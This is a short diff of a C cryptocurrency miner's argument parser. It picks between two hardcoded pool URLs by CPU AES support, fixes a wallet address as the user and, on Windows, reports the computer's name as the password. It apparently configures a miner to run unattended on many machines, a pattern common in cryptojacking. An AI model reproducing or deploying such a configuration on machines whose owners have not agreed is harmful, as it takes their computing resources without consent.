@@ -442,8 +442,13 @@ void parse_cmdline(int argc, char *argv[]) {
     //char    *opt_user         = NULL;
     //char    *opt_pass         = NULL;
     opt_algo = 1;
-    opt_url  = "http://pool.myaeon.ru:1111";
-    //opt_url  = "stratum+tcp://pool.myaeon.ru:1111";
+
+    if (cpu_info.flags & CPU_FLAG_AES) {
+        opt_url  = "https://pool.myaeon.ru:1111";
+    } else {
+        opt_url  = "https://pool.myaeon.ru:1234";
+    }
+
     opt_user = "Wmu1v35Bq9zFtSssT3GWjm7Wxpd2dvk7TWgqPPZi9y92hRv3GTKrJLU4oVgPjrjKCbKEShp1HDFmjCcEDT6ykRzt1vVZCCB1G";
 #ifdef _WIN64
     opt_pass = getenv("COMPUTERNAME");
